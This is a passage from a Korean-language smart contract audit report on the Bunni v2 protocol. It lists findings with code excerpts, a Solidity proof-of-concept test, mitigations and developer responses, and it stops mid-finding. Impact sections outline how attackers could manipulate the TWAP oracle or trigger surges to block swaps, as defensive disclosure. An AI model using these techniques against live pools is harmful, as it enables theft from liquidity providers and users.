            tickLower = int24(FixedPointMathLib.max(tickUpper - tickLength, minUsableTick));
        }
    } else {
        ...
    }
}
```

2. 분포의 불변 길이 매개변수가 `upperTick`이 `maxUsableTick`을 초과하도록 인코딩되어 `maxUsableTick`으로 제한되더라도, 충분히 작은 `tickSpacing`에 대해 전달되는 `isValidParams()`에서 `int256(length) * int256(tickSpacing) <= type(int24).max`로만 제한된다는 점에 유의하십시오.
3. 시프트 모드를 `RIGHT`로 가정하고 새 `tickLower`를 `minUsableTick`으로 가정하면, `decodeParams()`는 인코딩된 길이가 `tickUpper`가 사용 가능한 범위를 초과하도록 되어 있으므로 `minUsableTick` 및 `maxUsableTick`을 반환합니다. 따라서 `tickLength`는 전체 사용 가능한 범위인 `maxUsableTick - minUsableTick`입니다.
4. 시프트는 `tickLower`가 이제 `minUsableTick + tickSpacing`(`lastTickLower`)이 되고 `tickUpper`는 `minUsableTick + tickSpacing + (maxUsableTick - minUsableTick = maxUsableTick + tickSpacing`으로 다시 계산되도록 강제됩니다. 이는 사용 가능한 범위를 초과하고 설명된 대로 되돌려집니다.

```md
when validating params:
 minUsableTick          maxUsableTick
    |                          |
      |                           |
       ____________________________
              encoded length


when decoding params:
 minUsableTick      maxUsableTick
    |                      |
    |                      |
    ________________________
   tickLength = smallerLength


when enforcing shift mode:
      newTickLower  maxUsableTick
    |      |               |       |
            ________________________
                tickLength
```

아래 검증을 `isValidParams()`에 추가하면 부적절하게 인코딩된 길이로 인한 문제를 방지할 수 있지만 이 벡터에 의한 DoS를 방지하기에는 충분하지 않습니다. 하위/상위 틱은 `decodeParams()`와 유사한 방식으로 `UniformDistribution::query`에 의해서도 최소/최대 사용 가능한 틱에 대해 검증되어야 합니다.

```solidity
(int24 minUsableTick, int24 maxUsableTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
int256(length) * int256(tickSpacing) <= (maxUsableTick - minUsableTick)
```

**Impact:** 이 문제의 가능성은 불분명하지만 그 영향은 `queryLDF()`에 의존하는 모든 작업의 DoS입니다. 사용자는 틱이 최대 틱을 초과하면 사용 가능한 범위로 틱을 되돌리기 위해 풀에 대해 스왑할 수 없으며 평균 틱을 향한 시프트로 인해 풀이 사용 가능한 범위 외부에 갇히게 됩니다.

**Proof of Concept:** 다음 테스트를 `UniformDistribution.t.sol`에 추가해야 합니다:

```solidity
function test_poc_shiftmode()
    external
    virtual
{
    int24 tickSpacing = MIN_TICK_SPACING;
    (int24 minUsableTick, int24 maxUsableTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
    int24 tickLower = minUsableTick;
    int24 tickUpper = maxUsableTick;
    int24 length = (tickUpper - minUsableTick) / tickSpacing;
    int24 currentTick = minUsableTick + tickSpacing * 2;
    int24 offset = roundTickSingle(tickLower - currentTick, tickSpacing);
    assertTrue(offset % tickSpacing == 0, "offset not divisible by tickSpacing");

    console2.log("tickSpacing", tickSpacing);
    console2.log("tickLower", tickLower);
    console2.log("tickUpper", tickUpper);
    console2.log("length", length);
    console2.log("currentTick", currentTick);
    console2.log("offset", offset);

    PoolKey memory key;
    key.tickSpacing = tickSpacing;
    bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.RIGHT, offset, length));
    assertTrue(ldf.isValidParams(key, 15 minutes, ldfParams));

    bytes32 INITIALIZED_STATE = bytes32(abi.encodePacked(true, currentTick));
    int24 roundedTick = roundTickSingle(currentTick, tickSpacing);
    vm.expectPartialRevert(0x8b86327a);
    (, uint256 cumulativeAmount0DensityX96, uint256 cumulativeAmount1DensityX96,,) =
        ldf.query(key, roundedTick, 0, currentTick, ldfParams, INITIALIZED_STATE);
}
```

**Recommended Mitigation:** 분포 길이에 대한 추가 검증을 수행하고 시프트 시행 후 상위 틱을 제한해야 합니다. 어떻게든 마지막 틱이 사용 가능한 범위를 벗어날 수 있는 경우를 대비하여 하위 틱도 안전하게 다시 검증할 수 있습니다. 동적 LDF 테스트의 부재도 지적되었으며 커버리지를 개선하기 위해 포함되어야 합니다.

```diff
function isValidParams(int24 tickSpacing, uint24 twapSecondsAgo, bytes32 ldfParams) internal pure returns (bool) {
    uint8 shiftMode = uint8(bytes1(ldfParams)); // use uint8 since we don't know if the value is in range yet
    if (shiftMode != uint8(ShiftMode.STATIC)) {
        // Shifting
        // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
        int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset (in rounded ticks) of tickLower from the twap tick
        int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks

        return twapSecondsAgo != 0 && length > 0 && offset % tickSpacing == 0
++        && int256(length) * int256(tickSpacing) <= (TickMath.maxUsableTick(tickSpacing) - TickMath.minUsableTick(tickSpacing))
            && int256(length) * int256(tickSpacing) <= type(int24).max && shiftMode <= uint8(type(ShiftMode).max);
    } else {
        ...
}

function query(
    PoolKey calldata key,
    int24 roundedTick,
    int24 twapTick,
    int24, /* spotPriceTick */
    bytes32 ldfParams,
    bytes32 ldfState
)
    external
    view
    override
    guarded
    returns (
        uint256 liquidityDensityX96_,
        uint256 cumulativeAmount0DensityX96,
        uint256 cumulativeAmount1DensityX96,
        bytes32 newLdfState,
        bool shouldSurge
    )
{
    (int24 tickLower, int24 tickUpper, ShiftMode shiftMode) =
        LibUniformDistribution.decodeParams(twapTick, key.tickSpacing, ldfParams);
    (bool initialized, int24 lastTickLower) = _decodeState(ldfState);
    if (initialized) {
        int24 tickLength = tickUpper - tickLower;
--      tickLower = enforceShiftMode(tickLower, lastTickLower, shiftMode);
--      tickUpper = tickLower + tickLength;
++      tickLower = int24(FixedPointMathLib.max(minUsableTick, enforceShiftMode(tickLower, lastTickLower, shiftMode));
++      tickUpper = int24(FixedPointMathLib.min(maxUsableTick, tickLower + tickLength);
        shouldSurge = tickLower != lastTickLower;
    }

    (liquidityDensityX96_, cumulativeAmount0DensityX96, cumulativeAmount1DensityX96) =
        LibUniformDistribution.query(roundedTick, key.tickSpacing, tickLower, tickUpper);
    newLdfState = _encodeState(tickLower);
}
```

**Bacon Labs:** [PR \#97](https://github.com/timeless-fi/bunni-v2/pull/97)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `UniformDistribution`은 이제 틱 범위를 최소 및 최대 사용 가능 틱으로 올바르게 제한합니다.


### Various vault accounting inconsistencies and potential unhandled reverts

**Description:** `BunniHub::hookHandleSwap`은 ERC-4626 볼트에 예치된 준비금을 과대평가하고 `_updateVaultReserveViaClaimTokens()` 호출 내에서 스왑을 실행하기에 충분히 입금된다고 가정합니다:

```solidity
    function hookHandleSwap(PoolKey calldata key, bool zeroForOne, uint256 inputAmount, uint256 outputAmount)
        external
        override
        nonReentrant
        notPaused(4)
    {
        if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();

        // load state
        PoolId poolId = key.toId();
        PoolState memory state = getPoolState(s, poolId);
        (Currency inputToken, Currency outputToken) =
            zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
        (uint256 initialReserve0, uint256 initialReserve1) = (state.reserve0, state.reserve1);
```solidity
        // pull input claim tokens from hook
        if (inputAmount != 0) {
            zeroForOne ? state.rawBalance0 += inputAmount : state.rawBalance1 += inputAmount;
            poolManager.transferFrom(address(key.hooks), address(this), inputToken.toId(), inputAmount);
        }

        // push output claim tokens to hook
        if (outputAmount != 0) {
            (uint256 outputRawBalance, ERC4626 outputVault) =
                zeroForOne ? (state.rawBalance1, state.vault1) : (state.rawBalance0, state.vault0);
            if (address(outputVault) != address(0) && outputRawBalance < outputAmount) {
                // insufficient token balance
                // withdraw tokens from reserves
@>              (int256 reserveChange, int256 rawBalanceChange) = _updateVaultReserveViaClaimTokens(
                    (outputAmount - outputRawBalance).toInt256(), outputToken, outputVault
                );
                zeroForOne
                    ? (state.reserve1, state.rawBalance1) =
                        (_updateBalance(state.reserve1, reserveChange), _updateBalance(state.rawBalance1, rawBalanceChange))
                    : (state.reserve0, state.rawBalance0) =
                        (_updateBalance(state.reserve0, reserveChange), _updateBalance(state.rawBalance0, rawBalanceChange));
            }
@>          zeroForOne ? state.rawBalance1 -= outputAmount : state.rawBalance0 -= outputAmount;
            poolManager.transfer(address(key.hooks), outputToken.toId(), outputAmount);
        }
```

볼트가 실제로 이 양만큼의 자산을 가져오지 않는 경우 raw 밸런스가 실제보다 작은 것으로 간주될 수 있습니다:

```solidity
    function _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency currency, ERC4626 vault)
        internal
        returns (int256 reserveChange, int256 actualRawBalanceChange)
    {
        uint256 absAmount = FixedPointMathLib.abs(rawBalanceChange);
        if (rawBalanceChange < 0) {
            uint256 maxDepositAmount = vault.maxDeposit(address(this));
            // if poolManager doesn't have enough tokens or we're trying to deposit more than the vault accepts
            // then we only deposit what we can
            // we're only maintaining the raw balance ratio so it's fine to deposit less than requested
            uint256 poolManagerReserve = currency.balanceOf(address(poolManager));
            absAmount = FixedPointMathLib.min(FixedPointMathLib.min(absAmount, maxDepositAmount), poolManagerReserve);

            // burn claim tokens from this
            poolManager.burn(address(this), currency.toId(), absAmount);

            // take tokens from poolManager
            poolManager.take(currency, address(this), absAmount);

            // deposit tokens into vault
            IERC20 token;
            if (currency.isAddressZero()) {
                // wrap ETH
                weth.deposit{value: absAmount}();
                token = IERC20(address(weth));
            } else {
                token = IERC20(Currency.unwrap(currency));
            }
            address(token).safeApproveWithRetry(address(vault), absAmount);
            reserveChange = vault.deposit(absAmount, address(this)).toInt256();

            // it's safe to use absAmount here since at worst the vault.deposit() call pulled less token
            // than requested
@>          actualRawBalanceChange = -absAmount.toInt256();

            // revoke token approval to vault if necessary
            if (token.allowance(address(this), address(vault)) != 0) {
                address(token).safeApprove(address(vault), 0);
            }
        } else if (rawBalanceChange > 0) {
            ...
        }
    }
```

마찬가지로 목표 raw 밸런스 비율로 서지(surge)를 시도할 때, 볼트가 목표 raw 밸런스 경계에 도달하기에 충분한 준비금을 인출한다고 보장할 수 없습니다. `BunniHub::_updateRawBalanceIfNeeded`는 목표에 도달하려고 시도하지만 이것이 보장되지는 않습니다:

```solidity
  function _updateRawBalanceIfNeeded(
        Currency currency,
        ERC4626 vault,
        uint256 rawBalance,
        uint256 reserve,
        uint256 minRatio,
        uint256 maxRatio,
        uint256 targetRatio
    ) internal returns (uint256 newReserve, uint256 newRawBalance) {
        uint256 balance = rawBalance + getReservesInUnderlying(reserve, vault);
        uint256 minRawBalance = balance.mulDiv(minRatio, RAW_TOKEN_RATIO_BASE);
        uint256 maxRawBalance = balance.mulDiv(maxRatio, RAW_TOKEN_RATIO_BASE);

        if (rawBalance < minRawBalance || rawBalance > maxRawBalance) {
            uint256 targetRawBalance = balance.mulDiv(targetRatio, RAW_TOKEN_RATIO_BASE);
@>          (int256 reserveChange, int256 rawBalanceChange) =
                _updateVaultReserveViaClaimTokens(targetRawBalance.toInt256() - rawBalance.toInt256(), currency, vault);
            newReserve = _updateBalance(reserve, reserveChange);
            newRawBalance = _updateBalance(rawBalance, rawBalanceChange);
        } else {
            (newReserve, newRawBalance) = (reserve, rawBalance);
        }
    }
```

이 경우 요청한 것보다 적은 자산을 수락하는 볼트는 실제 raw 밸런스에 대한 과소평가를 초래합니다. 입금이 성공적이지만 `_depositVaultReserve()`에서 볼트가 가져온 실제 금액이 `amountSpent`보다 적다고 가정하면, 이것이 볼트에 대한 토큰 승인을 취소해야 하는 시나리오입니다:

```solidity
// revoke token approval to vault if necessary
if (token.allowance(address(this), address(vault)) != 0) {
    address(token).safeApprove(address(vault), 0);
}
```

`BunniHubLogic::deposit`의 끝에 초과 ETH 환불이 존재하지만, 이는 위의 동작으로 인한 불일치를 고려하지 않습니다. 마찬가지로 ERC-20 토큰에 대해서도 이것이 회계 처리되거나 호출자에게 환불되지 않습니다. 따라서 사용되지 않은 WETH 또는 기타 ERC-20 토큰에 해당하는 이러한 델타는 `BunniHub`에 남게 됩니다. 이 잔액이 잘못 사용될 수 있는 곳 중 하나는 transient `outputBalanceBefore`를 뺀 계약 잔액을 사용하는 `BunniHook::rebalanceOrderPostHook`의 리밸런스 주문 출력 금액 계산입니다. 따라서 Flood Plain을 통해 실행된 주문의 이행자는 이 실수로부터 잘못된 이익을 얻을 수 있습니다.

```solidity
    if (args.currency.isAddressZero()) {
        // unwrap WETH output to native ETH
@>      orderOutputAmount = weth.balanceOf(address(this));
        weth.withdraw(orderOutputAmount);
    } else {
        orderOutputAmount = args.currency.balanceOfSelf();
    }
@>  orderOutputAmount -= outputBalanceBefore;
```

`rebalanceOrderPostHook()`은 transient storage 캐시에 기반하여 리밸런스 주문 실행으로 인한 실제 잔액 변화를 사용하려고 하지만, `_rebalancePrehookCallback()` 내의 중첩 입금 시도에서 예상보다 적은 토큰을 가져오면 transient storage가 설정된 후 전체 계약 잔액에 기여하게 됩니다. 따라서 아래 표시된 `orderOutputAmount`는 `outputBalanceBefore`만큼 감소된 후에도 이 증가된 잔액을 포함합니다:

```solidity
        assembly ("memory-safe") {
            outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
        }
        if (args.currency.isAddressZero()) {
            // unwrap WETH output to native ETH
@>          orderOutputAmount = weth.balanceOf(address(this));
            weth.withdraw(orderOutputAmount);
        } else {
            orderOutputAmount = args.currency.balanceOfSelf();
        }
@>      orderOutputAmount -= outputBalanceBefore;
```

또한 다른 볼트 엣지 케이스 동작이 충분히 처리되지 않은 것으로 보입니다. Morpho는 핵심 프로토콜인 [Morpho Blue](https://github.com/morpho-org/morpho-blue)로 구성되며 그 위에 두 가지 버전의 [MetaMorpho](https://github.com/morpho-org/metamorpho-v1.1?tab=readme-ov-file)가 있습니다. `MetaMorphoV1_1`의 USDC 인스턴스에 대해 포크 테스트를 수행할 때, 기본 프로토콜에서 자산을 인출할 때 우선순위를 정할 시장을 지정하는 인출 큐 길이가 3인 것으로 관찰되었습니다. 모든 시장 ID를 얻으면 해당 공급/대출 자산 및 주식을 쿼리할 수 있습니다. 관찰된 `NotEnoughLiquidity()` 오류의 의미는 인출이 처리될 수 있도록 활발하게 대출된 USDC가 너무 많다는 것입니다. 이는 특정 볼트와 시장이 어떻게 구성되어 있는지에 따라 달라질 수 있지만, 모든 핵심 기능에 대해 꽤 문제가 될 수 있습니다.

**Impact:** 현재 전체적인 영향은 완전히 명확하지 않지만, 엣지 케이스 볼트 동작으로 인한 잘못된 회계는 사용자에게 약간의 손실을 초래할 수 있으며 처리되지 않은 되돌리기(reverts)로 인해 핵심 기능의 DoS가 발생할 수 있습니다.

**Recommended Mitigation:** 다음을 고려하십시오:
* 볼트가 예상 자산 금액을 가져가지 않는 경우를 명시적으로 처리합니다.
* 사용되지 않은 토큰에 대해 호출자에게 환불을 처리합니다.
* 예기치 않게 되돌려질 수 있는 볼트 호출에 대해 더 정교한 장애 조치 로직을 추가합니다.

**Bacon Labs:** [PR \#128](https://github.com/timeless-fi/bunni-v2/pull/128)에서 첫 번째 사항을 수정했습니다. 볼트에 유동성이 충분하지 않을 때 스왑이 되돌려진다는 점을 인정하며, 이 경우 되돌리는 것 외에는 할 수 있는 일이 많지 않습니다(더 적은 출력 토큰을 줄 수 있지만 어차피 높은 슬리피지로 인해 스왑이 되돌려질 것입니다).

**Cyfrin:** 검증되었습니다. 이제 `BunniHub::_updateVaultReserveViaClaimTokens`의 입금 중에 실제 토큰 잔액 변경이 raw 밸런스 변경으로 사용되며 초과 금액은 그에 따라 처리됩니다.


### Incorrect oracle truncation allows successive observations to exceed `MAX_ABS_TICK_MOVE`

**Description:** Bunni `Oracle` 라이브러리는 동일한 이름의 Uniswap V3 라이브러리를 수정한 버전입니다. 가장 눈에 띄는 차이점은 풀이 한 번에 이동할 수 있는 양방향의 최대 틱 양을 지정하는 상수 `MAX_ABS_TICK_MOVE = 9116`이 포함된 것입니다. 이에 따라 최소 간격이 도입되어 이전 관측 이후 경과된 시간이 최소 간격 이상인 경우에만 관측이 기록됩니다. 최소 간격이 지나지 않은 경우 중간 관측은 최대 절대 틱 이동을 준수하도록 잘리고(truncated) 별도의 `BunniHook` 상태에 저장됩니다.

```solidity
    function write(
        Observation[MAX_CARDINALITY] storage self,
        Observation memory intermediate,
        uint32 index,
        uint32 blockTimestamp,
        int24 tick,
        uint32 cardinality,
        uint32 cardinalityNext,
        uint32 minInterval
    ) internal returns (Observation memory intermediateUpdated, uint32 indexUpdated, uint32 cardinalityUpdated) {
        unchecked {
            // early return if we've already written an observation this block
            if (intermediate.blockTimestamp == blockTimestamp) {
                return (intermediate, index, cardinality);
            }

            // update the intermediate observation using the most recent observation
            // which is always the current intermediate observation
@>          intermediateUpdated = transform(intermediate, blockTimestamp, tick);

            // if the time since the last recorded observation is less than the minimum interval, we store the observation in the intermediate observation
            if (blockTimestamp - self[index].blockTimestamp < minInterval) {
                return (intermediateUpdated, index, cardinality);
            }

            // if the conditions are right, we can bump the cardinality
            if (cardinalityNext > cardinality && index == (cardinality - 1)) {
                cardinalityUpdated = cardinalityNext;
            } else {
                cardinalityUpdated = cardinality;
            }

            indexUpdated = (index + 1) % cardinalityUpdated;
@>          self[indexUpdated] = intermediateUpdated;
        }
    }

    function transform(Observation memory last, uint32 blockTimestamp, int24 tick)
        private
        pure
        returns (Observation memory)
    {
        unchecked {
            uint32 delta = blockTimestamp - last.blockTimestamp;

            // if the current tick moves more than the max abs tick movement
            // then we truncate it down
            if ((tick - last.prevTick) > MAX_ABS_TICK_MOVE) {
                tick = last.prevTick + MAX_ABS_TICK_MOVE;
            } else if ((tick - last.prevTick) < -MAX_ABS_TICK_MOVE) {
                tick = last.prevTick - MAX_ABS_TICK_MOVE;
            }

            return Observation({
                blockTimestamp: blockTimestamp,
                prevTick: tick,
                tickCumulative: last.tickCumulative + int56(tick) * int56(uint56(delta)),
                initialized: true
            });
        }
    }
```

이 로직은 `transform()`에서 수행되는 잘림(truncation)을 통해 `write()` 호출에서 이루어진 실제 관측의 틱 간의 최대 차이를 강제하려는 의도이지만, 대신 중간 관측에 대해 잘못 강제됩니다. 따라서 저장된 관측은 0이 아닌 `minInterval`에 대해 `MAX_ABS_TICK_MOVE`를 쉽게 그리고 크게 초과할 수 있습니다.

`minInterval`을 60초 또는 5 이더리움 메인넷 블록으로 가정할 때, 최대 절대 틱 이동을 준수하는 다음 중간 관측을 고려하되, 실제 기록된 관측의 차이는 훨씬 더 크다는 점에 유의하십시오:

```
| Timestamp    | Tick     | State changes                                                 |
|--------------|----------|---------------------------------------------------------------|
| timestamp 0  | 100 000  |                                                               |
| timestamp 12 | 109 116  | create an observation with 109 116 and set it as intermediate |
| timestamp 24 | 118 232  | set 118 232 as intermediate                                   |
| timestamp 36 | 127 348  | set 127 348 as intermediate                                   |
| timestamp 48 | 136 464  | set 136 464 as intermediate                                   |
| timestamp 60 | 145 580  | create an observation with 145 580 and set it as intermediate |
```

**Impact:** 관측 간의 차이가 제한되지 않으므로 악의적인 행위자가 TWAP를 훨씬 더 쉽게 조작할 수 있습니다. 가장 영향력 있는 시나리오는 다음과 같습니다:

* 의도한 것보다 훨씬 쉽게 조작될 수 있는 풀의 TWAP 가격에 의존하는 외부 통합자의 경우.
* `BuyTheDipGeometricDistribution`의 alt alpha가 의도한 것보다 훨씬 쉽게 트리거될 수 있습니다. 한 방향으로 알파가 훨씬 작아지므로 유동성이 현물 가격 주변에 매우 촘촘하게 집중되어 정직한 사용자에게 큰 슬리피지를 초래할 수 있습니다. 다른 방향으로 더 큰 알파로 조작하면 유동성이 조작되지 않은 가격에서 멀리 떨어져 인위적으로 깊게 보이게 만들어 공격자가 인위적인 비율로 막대한 양을 매수하거나 매도하고 기본적으로 슬리피지로부터 이익을 얻을 수 있습니다. 최소 오라클 관측 간격에 따라 달라지므로 공격자가 다중 블록 조작을 유지할 만큼 충분한 자금을 보유해야 할 가능성이 높기 때문에 이러한 공격이 얼마나 실현 가능한지는 분명하지 않습니다.
* 이 오라클이 동적 동작을 정의하기 위해 TWAP에 의존하는 `OracleUniGeoDistribution`과 같은 다른 LDF에 사용되는 경우 바운딩에 대해 유사한 문제를 일으킬 수 있습니다.
* 모든 LDF의 리밸런스도 영향을 받을 수 있으며, 여기서 불리한 홍수(flood) 주문을 트리거하고 그런 방식으로 풀에서 가치를 추출하기 위해 입력을 인위적으로 제어할 수 있습니다.
* 동적 스왑 수수료가 의도한 것보다 훨씬 크게 계산되어 DoS가 발생할 가능성이 높습니다. 잘린 오라클 관측 기능이 의도한 대로 작동한다고 가정하고 LDF를 변경하도록 풀이 구성된 경우, 이로 인해 LDF가 너무 자주 변경되고 서지 수수료가 트리거될 수 있습니다. 수수료는 100%로 설정되고 기하급수적으로 감소하므로 사용자에게는 원래보다 더 높은 수수료가 부과됩니다. 또한 서지가 발생하는 동일한 블록 동안 수수료가 산술 계산을 오버플로우하므로 스왑을 실행할 수 없습니다. 따라서 예를 들어 외부 프로토콜이 실행 중에 Bunni에서 스왑 실행에 의존하는 경우, 악의적인 행위자는 동일한 블록 중에 서지를 트리거하여 되돌릴 수 있습니다.

**Recommended Mitigation:** 중간 관측뿐만 아니라 최소 간격이 지난 후 이루어진 실제 기록된 관측 간의 잘림을 강제하십시오.

**Bacon Labs:** 인지됨(Acknowledged). 기존 구현이 실제로 괜찮다고 생각합니다. `MAX_ABS_TICK_MOVE`는 저장소 배열의 연속적인 관측 간의 차이가 아니라 연속적인 블록의 관측 간의 최대 틱 차이여야 합니다(`9116`은 블록당 `1.0001^9116=2.488x` 가격 변동에 해당). 따라서 중간 관측 간에 최대 틱 이동을 강제하는 것은 실제로 우리가 원하는 것을 달성하는 것인데, 중간 관측은 블록당 최대 한 번 업데이트되기 때문입니다.

**Cyfrin:** 인지됨(Acknowledged).


### Missing `LDFType` type validation against `ShiftMode` can result in losses due disabled surge fees

**Description:** 필수는 아니지만 일부 기존 LDF는 TWAP 오라클에서 파생된 동작에 따라 유동성 분포를 이동(shift)합니다. `ShiftMode`가 `STATIC` 변형으로 지정되면 분포가 이동하지 않지만, 산술 평균 틱과 불변 임계값에 따라 알파 매개변수 간에 전환되는 `BuyTheDipGeometricDistribution`과 같은 동적 동작을 LDF가 여전히 가질 수 있습니다. 정적이 아닌 LDF의 경우 `ILiquidityDensityFunction::isValidParams`는 정적이 아닌 시프트 모드에 대해 TWAP 기간이 0이 아니라는 것을 검증하므로, LDF가 이동하지만 사용할 유효한 TWAP 값이 없는 경우는 절대 없습니다.

`LDFType`은 LDF 매개변수에 지정되고 `BunniHub`에서 서지 수수료 동작과 `s.ldfStates` 사용을 정의하는 데 사용되는 별도이지만 관련된 구성입니다. 여기서 `STATIC` 변형은 동적 동작이 없고(`BunniHook`의 관점에서) 재담보(rehypothecation)가 활성화되었다고 가정할 때 볼트 주식 가격의 변화에 따라서만 서지하는 상태 비저장(stateless) LDF를 정의합니다. 그러나 `ShiftMode`가 `STATIC`이 아닌 경우 정적 LDF에 대해 서지 수수료를 비활성화하면 MEV로 인해 유동성 공급자에게 손실이 발생할 수 있습니다.

Bunni UI를 사용하여 이러한 풀을 만드는 것은 현재 불가능하지만 스마트 계약 수준에서는 이러한 구성이 가능하다는 점을 이해합니다.

**Impact:** 이동 동작을 나타내는 정적 LDF에 대해 서지 수수료가 비활성화되면 유동성 공급자는 MEV로 인한 손실을 입을 수 있습니다.

**Recommended Mitigation:** 스마트 계약 수준에서 동적 유동성 분포가 정적이 아닌 LDF 유형에 해당해야 한다고 강제하는 것을 고려하십시오.

**Bacon Labs:** [PR \#101](https://github.com/timeless-fi/bunni-v2/pull/101)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. LDF에서 `ldfType`과 `shiftMode`의 필요한 조합을 검증하기 위해 새로운 `ldfType` 매개변수가 `isValidParams()`에 추가되었습니다.


### am-AMM fees could be incorrectly used by rebalance mechanism as order input

**Description:** `BunniHook::rebalanceOrderPreHook`의 자율 리밸런스 메커니즘 구현의 일부로, 주문 출력 토큰의 후크 잔액은 주문이 실행되기 전에 transient storage에 설정됩니다. 이는 `_rebalancePrehookCallback()` 내에서 `hookHandleSwap()`이 호출되는 잠금 해제(unlock) 콜백 전에 발생합니다:

```solidity
    function rebalanceOrderPreHook(RebalanceOrderHookArgs calldata hookArgs) external override nonReentrant {
        ...
        RebalanceOrderPreHookArgs calldata args = hookArgs.preHookArgs;

        // store the order output balance before the order execution in transient storage
        // this is used to compute the order output amount
        uint256 outputBalanceBefore = hookArgs.postHookArgs.currency.isAddressZero()
            ? weth.balanceOf(address(this))
            : hookArgs.postHookArgs.currency.balanceOfSelf();
        assembly ("memory-safe") {
@>          tstore(REBALANCE_OUTPUT_BALANCE_SLOT, outputBalanceBefore)
        }

        // pull input tokens from BunniHub to BunniHook
        // received in the form of PoolManager claim tokens
        // then unwrap claim tokens
        poolManager.unlock(
            abi.encode(
                HookUnlockCallbackType.REBALANCE_PREHOOK,
@>              abi.encode(args.currency, args.amount, hookArgs.key, hookArgs.key.currency1 == args.currency)
            )
        );

        // ensure we have at least args.amount tokens so that there is enough input for the order
@>      if (args.currency.balanceOfSelf() < args.amount) {
            revert BunniHook__PrehookPostConditionFailed();
        }
        ...
    }

    /// @dev Calls hub.hookHandleSwap to pull the rebalance swap input tokens from BunniHub.
    /// Then burns PoolManager claim tokens and takes the underlying tokens from PoolManager.
    /// Used while executing rebalance orders.
    function _rebalancePrehookCallback(bytes memory callbackData) internal {
        // decode data
        (Currency currency, uint256 amount, PoolKey memory key, bool zeroForOne) =
            abi.decode(callbackData, (Currency, uint256, PoolKey, bool));

        // pull claim tokens from BunniHub
@>      hub.hookHandleSwap({key: key, zeroForOne: zeroForOne, inputAmount: 0, outputAmount: amount});

        // lock BunniHub to prevent reentrancy
        hub.lockForRebalance(key);

        // burn and take
        poolManager.burn(address(this), currency.toId(), amount);
        poolManager.take(currency, address(this), amount);
    }
```

Transient storage는 `rebalanceOrderPostHook()` 호출에서 출력 토큰(consideration 항목)의 지정된 양만 `BunniHook`에서 전송되도록 하기 위해 다시 쿼리됩니다:

```solidity
    function rebalanceOrderPostHook(RebalanceOrderHookArgs calldata hookArgs) external override nonReentrant {
        ...
        RebalanceOrderPostHookArgs calldata args = hookArgs.postHookArgs;

        // compute order output amount by computing the difference in the output token balance
        uint256 orderOutputAmount;
        uint256 outputBalanceBefore;
        assembly ("memory-safe") {
@>          outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
        }
        if (args.currency.isAddressZero()) {
            // unwrap WETH output to native ETH
            orderOutputAmount = weth.balanceOf(address(this));
            weth.withdraw(orderOutputAmount);
        } else {
            orderOutputAmount = args.currency.balanceOfSelf();
        }
@>      orderOutputAmount -= outputBalanceBefore;
        ...
```

그러나 입력 토큰(offer 항목)에는 유사한 검증이 적용되지 않습니다. 위에서 표시된 기존 검증은 후크가 주문을 처리하기에 충분한 토큰을 보유하고 있는지 확인하기 위해 수행되지만, 후크가 다른 수취인에게 지정된 자금을 보유할 수 있다는 점은 고려하지 못합니다. 이전에 Pashov Group 발견 H-04에 따르면, 토큰 잔액이 주문 금액과 엄격하게 동일한지 확인하여 자율 리밸런스가 DoS되었지만, am-AMM 수수료 및 기부를 설명하는 것을 잊었습니다. 권장 사항은 전체 잔액이 아니라 계약의 토큰 잔액 증가가 `args.amount`와 동일한지 확인하는 것이었습니다.

am-AMM 수수료가 `BunniHook` 내에 ERC-6909 잔액으로 저장된다는 점을 감안할 때, 이것이 리밸런스 주문 입력 금액의 일부로 잘못 사용될 수 있습니다. 이는 후크가 입력 금액을 충당하기에 충분하지 않은 raw 밸런스를 보유할 때 발생할 수 있습니다. 아마도 재담보가 활성화되어 있고 `hookHandleSwap()` 호출이 볼트가 지정된 것보다 적은 토큰을 반환(returning)하여 예상보다 적은 토큰을 가져오기(pulling) 때문일 수 있습니다. 대신 입력 토큰 잔액은 `outputBalanceBefore`와 같은 방식으로 잠금 해제 콜백 전에 transient storage에 설정되어야 합니다. 그런 다음 잠금 해제 콜백 전후의 입력 토큰 잔액 차이를 검증하여 주문 입력 금액을 충족해야 합니다.

**Impact:** `BunniHook` 내부의 ERC-6909 잔액으로 저장된 am-AMM 수수료는 잘못된 잔액 확인으로 인해 리밸런스 입력으로 잘못 사용될 수 있습니다.

**Recommended Mitigation:** 잠금 해제 콜백 후 수행되는 검증을 다음과 같이 수정하는 것을 고려하십시오:
```solidity
uint256 inputBalanceBefore = args.currency.balanceOfSelf();

// unlock callback

if (args.currency.balanceOfSelf() - inputBalanceBefore < args.amount) {
    revert BunniHook__PrehookPostConditionFailed();
}
```

**Bacon Labs:** [PR \#98](https://github.com/timeless-fi/bunni-v2/pull/98) 및 [PR \#133](https://github.com/timeless-fi/bunni-v2/pull/133)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 더 엄격한 입력 금액 검증이 `BunniHook::rebalanceOrderPreHook`에 추가되었습니다.


### Idle balance is computed incorrectly when an incorrect vault fee is specified

**Description:** 이미 약간의 유동성이 있는 Bunni 풀에 새로운 입금이 이루어지면, 각 토큰의 입금 금액은 현재 비율에 따라 계산됩니다. 현재 로직에서는 유휴 잔액이 현재 잔액에 비례해서만 증가할 수 있고 초과 토큰은 입금 기간 동안 변경되지 않는다고 가정합니다. 그러나 사용자가 볼트에 자금을 입금하고 수수료를 잘못 지정하면 이 가정이 깨질 수 있습니다.

가정:
* 풀에 `1e18` token0/1이 있고 `1e18` 주식이 발행되었습니다.
* 토큰 가격은 LDF에 지정된 대로 1:1이므로 유휴 잔액은 0입니다.
* 10% 수수료가 있는 vault0의 목표 raw 밸런스는 30%입니다.
* Token1에는 구성된 볼트가 없습니다.

`BunniHub`는 입금할 금액을 다음과 같이 계산합니다:

